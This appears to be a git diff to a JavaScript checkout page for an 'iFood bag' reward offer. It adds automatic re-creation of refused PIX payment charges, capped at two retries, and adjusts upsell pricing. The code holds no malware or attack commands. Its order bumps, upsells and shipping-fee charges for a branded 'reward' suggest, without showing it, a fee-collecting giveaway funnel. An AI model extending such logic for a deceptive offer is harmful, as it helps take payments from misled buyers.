@@ -109,7 +109,8 @@ const STORAGE_KEYS = {
     vslCompleted: 'ifoodbag.vslCompleted',
     orderbumpBackAutoPix: 'ifoodbag.orderbumpBackAutoPix',
     pixCreateLock: 'ifoodbag.pixCreateLock',
-    pixelEventDedupe: 'ifoodbag.pixelEventDedupe'
+    pixelEventDedupe: 'ifoodbag.pixelEventDedupe',
+    pixAutoRetryState: 'ifoodbag.pixAutoRetryState'
 };
 
 const REWARD_CATALOG = {
@@ -3060,6 +3061,206 @@ function initPix() {
     }
     syncPixQrButtonState();
 
+    const PIX_AUTO_RETRY_MAX = 2;
+    let pixRegenerationBusy = false;
+
+    const sanitizePixAutoRetryToken = (value = '', fallback = 'pix') => {
+        const clean = String(value || '')
+            .trim()
+            .toLowerCase()
+            .replace(/[^a-z0-9_-]/g, '');
+        return clean || fallback;
+    };
+
+    const getPixAutoRetryBucketKey = () => {
+        const sessionToken = sanitizePixAutoRetryToken(getLeadSessionId(), 'session');
+        const kindToken = isUpsellPix
+            ? sanitizePixAutoRetryToken(
+                pix?.upsell?.kind ||
+                pix?.shippingId ||
+                pix?.shippingName ||
+                'upsell',
+                'upsell'
+            )
+            : 'base';
+        return `${sessionToken}:${kindToken}`;
+    };
+
+    const loadPixAutoRetryMap = () => {
+        try {
+            const raw = sessionStorage.getItem(STORAGE_KEYS.pixAutoRetryState);
+            if (!raw) return {};
+            const parsed = JSON.parse(raw);
+            if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) return {};
+            return parsed;
+        } catch (_error) {
+            return {};
+        }
+    };
+
+    const savePixAutoRetryMap = (map = {}) => {
+        try {
+            sessionStorage.setItem(STORAGE_KEYS.pixAutoRetryState, JSON.stringify(map || {}));
+        } catch (_error) {}
+    };
+
+    const getPixAutoRetryBucket = () => {
+        const key = getPixAutoRetryBucketKey();
+        const map = loadPixAutoRetryMap();
+        const bucket = map[key];
+        if (!bucket || typeof bucket !== 'object' || Array.isArray(bucket)) {
+            return { key, map, bucket: { total: 0, txids: {} } };
+        }
+        return {
+            key,
+            map,
+            bucket: {
+                total: Number(bucket.total || 0) || 0,
+                txids: bucket.txids && typeof bucket.txids === 'object' && !Array.isArray(bucket.txids)
+                    ? bucket.txids
+                    : {}
+            }
+        };
+    };
+
+    const canAutoRetryPixTxid = (txid = '') => {
+        const cleanTxid = String(txid || '').trim();
+        if (!cleanTxid) return false;
+        const { bucket } = getPixAutoRetryBucket();
+        if (bucket.total >= PIX_AUTO_RETRY_MAX) return false;
+        return !bucket.txids[cleanTxid];
+    };
+
+    const markAutoRetryPixTxid = (txid = '') => {
+        const cleanTxid = String(txid || '').trim();
+        if (!cleanTxid) return;
+        const { key, map, bucket } = getPixAutoRetryBucket();
+        map[key] = {
+            total: bucket.total + 1,
+            txids: {
+                ...bucket.txids,
+                [cleanTxid]: Date.now()
+            }
+        };
+        savePixAutoRetryMap(map);
+    };
+
+    const resolvePixRetryBumpPrice = () => {
+        if (isUpsellPix) return 0;
+        const bumpData = loadBump() || {};
+        const bumpSelected = bumpData?.selected === true && Number(bumpData?.price || 0) > 0;
+        return bumpSelected ? Number(bumpData.price || 0) : 0;
+    };
+
+    const resolvePixRetryShipping = () => {
+        if (isUpsellPix) {
+            const upsellPrice = Number(pix?.upsell?.price || 0) > 0
+                ? Number(pix.upsell.price || 0)
+                : Math.max(0, Number((Number(pix?.amount || 0) - rewardExtraPrice).toFixed(2)));
+            if (!Number.isFinite(upsellPrice) || upsellPrice <= 0) return null;
+            return {
+                id: String(pix?.shippingId || pix?.upsell?.kind || 'upsell_pix').trim() || 'upsell_pix',
+                name: String(pix?.shippingName || pix?.upsell?.title || 'Pagamento via PIX').trim() || 'Pagamento via PIX',
+                eta: '',
+                price: Number(upsellPrice.toFixed(2)),
+                basePrice: Number(upsellPrice.toFixed(2)),
+                originalPrice: Number(upsellPrice.toFixed(2)),
+                selectedAt: Date.now()
+            };
+        }
+
+        if (isShippingSelectionComplete(shipping)) {
+            return shipping;
+        }
+
+        const bumpPrice = resolvePixRetryBumpPrice();
+        const fallbackShippingBase = Math.max(
+            0,
+            Number((Number(pix?.amount || 0) - bumpPrice - rewardExtraPrice).toFixed(2))
+        );
+        if (fallbackShippingBase <= 0) return null;
+        const coupon = loadCoupon();
+        const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
+        const fallbackShippingOriginal = amountOff > 0
+            ? Number((fallbackShippingBase + amountOff).toFixed(2))
+            : fallbackShippingBase;
+
+        return {
+            id: String(pix?.shippingId || 'padrao').trim() || 'padrao',
+            name: String(pix?.shippingName || 'Envio Padrao iFood').trim() || 'Envio Padrao iFood',
+            eta: '',
+            price: fallbackShippingBase,
+            basePrice: fallbackShippingOriginal,
+            originalPrice: fallbackShippingOriginal,
+            selectedAt: Date.now(),
+            coupon: coupon?.code,
+            amountOff,
+            discountApplied: amountOff > 0
+        };
+    };
+
+    const resolvePixRetryOptions = (currentTxid = '') => {
+        if (!isUpsellPix) {
+            return { sourceStage: 'pix_auto_retry_refused' };
+        }
+        return {
+            sourceStage: 'pix_auto_retry_refused',
+            upsell: {
+                enabled: true,
+                kind: String(pix?.upsell?.kind || pix?.shippingId || 'upsell').trim() || 'upsell',
+                title: String(pix?.upsell?.title || pix?.shippingName || 'Prioridade de envio').trim() || 'Prioridade de envio',
+                price: Number(pix?.upsell?.price || pix?.amount || 0),
+                previousTxid: String(currentTxid || pix?.upsell?.previousTxid || '').trim(),
+                targetAfterPaid: String(pix?.upsell?.targetAfterPaid || '').trim()
+            }
+        };
+    };
+
+    const attemptAutoRegeneratePix = async (statusRaw = '') => {
+        const currentTxid = String(pix?.idTransaction || '').trim();
+        if (!currentTxid || pixRegenerationBusy || !canAutoRetryPixTxid(currentTxid)) {
+            return false;
+        }
+
+        const nextShipping = resolvePixRetryShipping();
+        if (!nextShipping) {
+            return false;
+        }
+
+        const bumpPrice = resolvePixRetryBumpPrice();
+        const refusedAt = new Date().toISOString();
+        pixRegenerationBusy = true;
+        inactiveStatusShown = true;
+        markAutoRetryPixTxid(currentTxid);
+        clearStatusPolling();
+
+        Object.assign(pix, {
+            status: 'refused',
+            statusRaw: String(statusRaw || 'refused'),
+            refusedAt
+        });
+        savePix({
+            ...pix,
+            status: 'refused',
+            statusRaw: String(statusRaw || 'refused'),
+            refusedAt
+        });
+
+        showToast('PIX inativo. Gerando um novo automaticamente...', 'info');
+
+        try {
+            await createPixCharge(nextShipping, bumpPrice, resolvePixRetryOptions(currentTxid));
+            return true;
+        } catch (error) {
+            pixRegenerationBusy = false;
+            if (!statusPollTimer) {
+                statusPollTimer = setInterval(pollPixStatus, pollIntervalMs);
+            }
+            showToast(error?.message || 'Nao foi possivel gerar um novo PIX automaticamente.', 'error');
+            return false;
+        }
+    };
+
     const handleCopy = async (button, inputEl = pixCode) => {
         const sourceInput = inputEl || pixCode || pixIofCode || pixCorreiosCode;
         if (!sourceInput) return;
@@ -3325,6 +3526,7 @@ function initPix() {
             }
 
             const status = normalizePixStatus(data?.status);
+            const statusRawText = String(data?.statusRaw || data?.status || '').trim();
             if (pixIofStatus) {
                 if (status === 'paid') {
                     pixIofStatus.textContent = 'Status: Pagamento confirmado';
@@ -3346,6 +3548,13 @@ function initPix() {
             if (status === 'paid') {
                 markPaidAndRedirect(data?.statusRaw);
                 return;
+            }
+
+            if (status === 'refused') {
+                const regenerated = await attemptAutoRegeneratePix(statusRawText);
+                if (regenerated) {
+                    return;
+                }
             }
 
             if (!inactiveStatusShown && (status === 'refunded' || status === 'refused')) {
@@ -6881,7 +7090,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
     const shippingForPix = isUpsell ? shippingInput : applyCouponToShipping(shippingInput);
     const reward = resolveRewardSelection(options?.reward || loadRewardSelection() || 'bag') || resolveRewardById('bag');
     const shippingPrice = Number(shippingForPix?.price || 0);
-    const rewardExtraPrice = getRewardExtraPrice(reward);
+    const rewardExtraPrice = isUpsell ? 0 : getRewardExtraPrice(reward);
     if (!shippingForPix || !Number.isFinite(shippingPrice) || shippingPrice < 0) {
         throw new Error('Selecione um frete valido antes de gerar o PIX.');
     }
@@ -6979,7 +7188,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             shippingName: shippingForPix.name,
             rewardId: String(data?.rewardId || reward?.id || 'bag'),
             rewardName: String(data?.rewardName || reward?.name || 'Bag do iFood'),
-            rewardExtraPrice: Number(data?.rewardExtraPrice || rewardExtraPrice || 0),
+            rewardExtraPrice: Number(data?.rewardExtraPrice ?? rewardExtraPrice ?? 0),
             rewardAsset: reward?.asset || '',
             rewardAlt: reward?.pixAlt || reward?.name || '',
             bumpName: extraCharge > 0 ? 'Seguro Bag' : '',
@@ -6990,7 +7199,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             reward: reward ? {
                 id: String(data?.rewardId || reward.id),
                 name: String(data?.rewardName || reward.name),
-                checkoutExtraPrice: Number(data?.rewardExtraPrice || rewardExtraPrice || 0),
+                checkoutExtraPrice: Number(data?.rewardExtraPrice ?? rewardExtraPrice ?? 0),
                 asset: reward.asset,
                 pixTitle: reward.pixTitle,
                 pixAlt: reward.pixAlt
